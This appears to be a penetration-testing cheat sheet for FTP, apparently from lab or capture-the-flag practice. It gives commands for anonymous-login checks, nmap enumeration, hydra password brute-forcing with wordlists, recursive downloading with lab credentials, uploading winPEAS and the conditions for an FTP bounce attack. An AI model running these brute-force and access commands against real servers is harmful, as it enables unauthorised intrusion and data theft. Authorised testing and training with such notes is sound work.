# FTP Checklist

### See if there is anonymous access

```bash
ftp $ip
ftp $ip 21
ftp -A $ip
ftp -A $ip 21
# input anonymous as username and password
# try in the browser
ftp://anonymous:anonymous@10.10.10.98
```

### Basic Enumeration

```bash
sudo nmap --script 'ftp-*' -p 21 $ip
```

### Additional Enumeration

```bash
nmap --script ftp-* -p 21 $ip 

ftp -A $RHOST  # '-A' forces active mode (not passive)

# interaction using the 'ftp' app
ftp> anonymous # username
ftp> anonymous # password
ftp> help # show list of supported commands
ftp> help CMD # show command-specific help
ftp> binary # set transmission to binary instead of ascii
ftp> ascii # set transmission to ascii instead of binary
ftp> ls -a # list all files (even hidden) (yes, they could be hidden)
ftp> cd DIR # change remote directory
ftp> lcd DIR # change local directory
ftp> pwd # print working directory
ftp> cdup  # change to remote parent directory
ftp> mkdir DIR # create directory
ftp> get FILE [NEWNAME] # download file to kali [and save as NEWNAME]
ftp> mget FILE1 FILE2 ... # get multiple files
ftp> put FILE [NEWNAME] # upload local file to FTP server [and save as NEWNAME]
ftp> mput FILE1 FILE2 ... # put multiple files
ftp> rename OLD NEW # rename remote file
ftp> delete FILE # delete remote file
ftp> mdelete FILE1 FILE2 ... # multiple delete remote files
ftp> mdelete *.txt # delete multiple files matching glob pattern
ftp> bye # exit, quit - all exit ftp connection
```

#### Brute force

```bash
hydra -l USERNAME -P /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f $ip ftp -V
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt $ip -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt $ip -t 4 ftp
hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.213.93
hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip ftp
```

#### Recursively download content

```bash
> prompt off
> recurse on
> mget *
```

or

```bash
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/
wget -m --no-passive ftp://anonymous:anonymous@$ip

find / -name Settings.*  2>/dev/null #looking through the files
```

#### Interact

MAKE SURE THAT THE PERMISSIONS OF YOUR LOCAL FILE ALLOW YOU TO PUT.
````
# Put File
put test.txt #check if it is reflected in a http port

# Upload Binary
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
````

### FTP Bounce Attack

- FTP valid credentials in the FTP Middle server
- FTP valid credentials in Victim FTP server
- Both server accepts the PORT command (bounce FTP attack)
- You can write inside some directory of the FTP Middle server
- The middle server will have more access inside the Victim FTP Server than you for some reason (this is what you are going to exploit)


#### FTP with OpenSSL

```bash
openssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any

lftp
lftp :~> set ftp:ssl-force true
lftp :~> set ssl:verify-certificate no
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> login                       
Usage: login <user|URL> [<pass>]
lftp 10.10.10.208:~> login username Password

```

#### Hydra for Simple Bruteforce

```bash
hydra -L usernames-shortlist -P best1050 $ip ftp
```
